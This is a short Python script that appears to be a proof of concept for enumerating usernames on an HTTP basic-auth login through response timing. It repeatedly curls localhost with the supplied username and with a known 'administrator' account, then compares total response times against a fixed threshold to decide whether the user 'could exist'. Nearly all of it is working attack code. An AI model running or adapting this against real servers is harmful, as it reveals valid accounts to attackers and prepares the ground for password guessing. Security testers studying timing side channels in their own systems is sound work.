#!/usr/bin/python
# this script, attempts to use the timing variation in real users and nonuser 
# inputs to an http basic auth interface.

# The premise is, find an oracle (in this case we use Administrator) and use the 
# Aggregate response time as the baseline.  We create an example administrator
# user for the purposes of this test.

# The script takes a single input ala: './basicauth.py username'

import sys
import timeit
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

username=sys.argv[1]

execme="""from subprocess import call
import os
FNULL = open(os.devnull, 'w')
call(["curl", "http://""" + username +""":obvious@localhost"],stdout=FNULL,stderr=FNULL)"""

execmenext="""from subprocess import call
import os
FNULL = open(os.devnull, 'w')
call(["curl", "http://administrator:aaa@localhost"],stdout=FNULL,stderr=FNULL)"""


avggarb=0
avgreal=0
i=0
totreal=0
totgarb=0
exitweight=0
flag=""
while True:
	i+=1
	garbageuser=timeit.timeit(execme,number=1)
	realuser=timeit.timeit(execmenext,number=1)
	if(i > 1):
		avggarb=garbageuser+avggarb/2
		totgarb+=garbageuser
		avgreal=realuser+avgreal/2
		totreal+=realuser
	else:
		
		avgreal=realuser
		avggarb=garbageuser
		totreal=avgreal
		totgarb=avggarb
	if( i % 450 == 0):
		# the constant std deviation 0.0145 is based on observation of my environment YMMV.
		if(abs((totreal/totgarb)-1) > 0.0145):
#			flag=bcolors.FAIL
			print username +" : doesn't exist"
		else:
#			flag=bcolors.OKGREEN
			print username +" : could exist"
		print flag + "RU/GU AVG:" + str(avgreal)+"/"+str(avggarb) +" TRE/TGB:"+str(totreal)+"/"+str(totgarb)+","+str(abs((totreal/totgarb)-1 ))
		exit(0)
